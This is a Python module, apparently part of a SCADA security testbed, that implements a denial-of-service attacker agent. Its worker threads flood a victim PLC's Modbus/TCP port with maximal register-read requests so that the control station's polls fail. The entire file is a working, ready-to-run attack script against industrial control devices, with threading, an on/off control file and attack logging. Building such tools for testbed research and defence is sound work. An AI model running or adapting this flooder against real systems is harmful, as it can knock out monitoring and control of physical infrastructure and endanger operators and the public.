"""Denial-of-service attacker agent: flood a victim PLC's Modbus/TCP service.

While the attack window is open, worker threads repeatedly connect to the
victim's Modbus port and issue read requests as fast as possible, saturating the
single-event-loop field device so that the MTU's polls miss their deadline and
are logged as failed connections (``connections.csv`` ``ok=0``) — a loss of
monitoring and control, the DoS effect. No ARP or MITM is needed: the attacker
reaches the victim directly over the SCADA network. It is still attached to one
field network only.

    python -m scadavt.attacks.dos --victim-ip 10.10.4.11 --port 502 \
        --workers 64 --control /logs/attacks/d1.json --log /logs/attacks/d1.csv
"""

from __future__ import annotations

import argparse
import csv
import json
import signal
import socket
import struct
import threading
import time
from pathlib import Path

# a valid Modbus/TCP read-holding-registers request (max span) to maximise work
_FLOOD_REQ = struct.pack(">HHHB", 0, 0, 6, 1) + bytes([3]) + struct.pack(">HH", 0, 125)


class DoS:
    def __init__(self, a):
        self.a = a
        self.active = False
        self._stop = False
        self.attempts = 0
        self._lock = threading.Lock()
        self.logf = Path(a.log)
        self.logf.parent.mkdir(parents=True, exist_ok=True)
        if not self.logf.exists():
            with open(self.logf, "w", newline="") as fh:
                csv.writer(fh).writerow(["wall_time", "event", "kind", "victim",
                                         "address", "mode", "value", "hits", "note"])

    def _log(self, event, note=""):
        with open(self.logf, "a", newline="") as fh:
            csv.writer(fh).writerow([round(time.time(), 3), event, "dos", self.a.victim_ip,
                                     "", "", self.a.workers, self.attempts, note])

    def _worker(self):
        while not self._stop:
            if not self.active:
                time.sleep(0.05)
                continue
            try:
                s = socket.create_connection((self.a.victim_ip, self.a.port), timeout=1.0)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                while self.active and not self._stop:
                    s.sendall(_FLOOD_REQ)
                    try:
                        s.recv(4096)
                    except OSError:
                        break
                    with self._lock:
                        self.attempts += 1
                s.close()
            except OSError:
                time.sleep(0.01)

    def run(self):
        for _ in range(self.a.workers):
            threading.Thread(target=self._worker, daemon=True).start()
        control = Path(self.a.control)
        self._log("ready")
        while not self._stop:
            want = False
            try:
                if control.exists():
                    want = bool(json.loads(control.read_text() or "{}").get("active"))
            except Exception:
                want = False
            if want and not self.active:
                self.active = True
                self._log("start")
            elif not want and self.active:
                self.active = False
                self._log("stop")
            time.sleep(0.2)
        self.active = False

    def shutdown(self, *_):
        self._stop = True


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--victim-ip", required=True)
    ap.add_argument("--port", type=int, default=502)
    ap.add_argument("--workers", type=int, default=64)
    ap.add_argument("--control", required=True)
    ap.add_argument("--log", required=True)
    a = ap.parse_args(argv)
    d = DoS(a)
    signal.signal(signal.SIGTERM, d.shutdown)
    signal.signal(signal.SIGINT, d.shutdown)
    d.run()


if __name__ == "__main__":
    main()
